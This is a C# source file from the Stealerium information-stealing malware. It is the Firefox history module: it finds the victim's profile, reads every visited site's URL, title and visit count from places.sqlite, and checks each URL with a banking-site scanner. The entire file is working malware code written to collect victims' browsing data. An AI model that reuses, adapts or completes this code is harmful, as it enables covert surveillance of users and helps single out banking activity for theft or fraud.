using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;
using Stealerium.Target.Browsers.Chromium;

namespace Stealerium.Target.Browsers.Firefox;

internal class CHistory
{
	private static string GetHistoryDbPath(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\places.sqlite"))
					{
						return text + "\\places.sqlite";
					}
				}
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox >> Failed to find history\n" + ex);
		}
		return null;
	}

	public static List<Site> Get(string path)
	{
		List<Site> list = new List<Site>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(GetHistoryDbPath(path), "moz_places");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Site site = default(Site);
				site.Title = Crypto.GetUtf8(sqLite.GetValue(i, 2));
				site.Url = Crypto.GetUtf8(sqLite.GetValue(i, 1));
				site.Count = Convert.ToInt32(sqLite.GetValue(i, 4)) + 1;
				Site item = site;
				if (!(item.Title == "0"))
				{
					Banking.ScanData(item.Url);
					Counter.History++;
					list.Add(item);
				}
			}
			return list;
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox >> history collection failed\n" + ex);
			return list;
		}
	}
}
